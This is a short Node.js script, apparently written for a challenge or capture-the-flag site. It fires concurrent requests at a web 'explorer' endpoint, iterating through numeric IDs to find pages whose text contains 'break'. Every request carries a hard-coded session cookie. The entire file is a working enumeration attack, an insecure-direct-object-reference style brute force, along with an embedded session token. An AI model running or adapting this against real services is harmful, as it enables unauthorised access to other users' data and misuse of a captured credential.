var PromisePool = require('es6-promise-pool')
const fetch = require('node-fetch');

let queueArray = [];
const opts = {
    headers: {
        cookie: 'session=eyJ1c2VybmFtZSI6ImFhcm9ubGlmZSJ9.DbdBag.5eWnbUNdUjdjWIkmICjsNY8hKUQ'
    }
  };
for(mill = 0; mill < 10; mill ++){
    for (i = 0; i < 10; i ++){
        for (j = 0; j < 10; j ++){
            for (k = 0; k < 10; k ++){
                    let num = mill * 1000000000 + i * 1000000 + j * 1000 + k;
                    queueArray.push(num);
            }
        }
    }
}
var n = 0;
var promiseProducer = function () {
  if(n < queueArray.length){
        n = n +1;
        return fetchData(queueArray[n]);
  }else{
      return null;
  }
}
async function fetchData(url){
    const response = await fetch('https://yipple.ns.agency/explorer/' + url, opts);
    const responsetext = await response.text();
    if(responsetext.toLowerCase().includes('break')){
        console.log(url)
        return url;
    }
    return 0;
}
// The number of promises to process simultaneously. 
var concurrency = 10
 
// Create a pool. 
var pool = new PromisePool(promiseProducer, concurrency)
 
// Start the pool. 
var poolPromise = pool.start()
 
// Wait for the pool to settle. 
poolPromise.then(function () {
  console.log('All promises fulfilled')
}, function (error) {
  console.log('Some promise rejected: ' + error.message)
});